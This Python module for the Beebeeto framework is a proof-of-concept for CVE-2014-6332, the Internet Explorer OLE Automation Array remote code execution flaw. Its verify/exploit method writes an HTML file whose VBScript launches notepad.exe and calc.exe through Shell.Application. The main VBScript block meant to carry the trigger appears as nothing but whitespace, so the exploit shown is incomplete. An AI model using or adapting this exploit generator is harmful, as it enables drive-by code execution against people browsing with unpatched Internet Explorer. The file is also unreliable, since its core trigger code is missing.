#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0144',
            'name': 'Internet Explorer OLE Automation Array 远程代码执行 POC',
            'author': 'yuange <twitter.com/yuange75>',
            'create_date': '2014-11-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Internet Explorer',
            'vul_version': ['*'],
            'type': 'Code Execution',
            'tag': ['Remote Code Execution', 'IE远程代码执行', 'ie'],
            'desc': '''
                    //*
                       allie(win95+ie3-win10+ie11) dve copy by yuange in 2009.
                       cve-2014-6332 exploit
                       https://twitter.com/yuange75
                       http://hi.baidu.com/yuange1975
                    *//
                    ''',
            'references': ['http://www.exploit-db.com/exploits/35229/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payload = '''
<!doctype html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
<head>
</head>
<body>
<SCRIPT LANGUAGE="VBScript">

function runmumaa()
On Error Resume Next
set shell=createobject("Shell.Application")
shell.ShellExecute "notepad.exe"
    shell.ShellExecute "calc.exe"
end function

</script>

<SCRIPT LANGUAGE="VBScript">

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            

</script>

</body>
</html>
        '''
        # write
        test_html = open('./ie-rce.html', 'w')
        test_html.write(payload)
        test_html.close()
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok, file: ./ie-rce.html'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())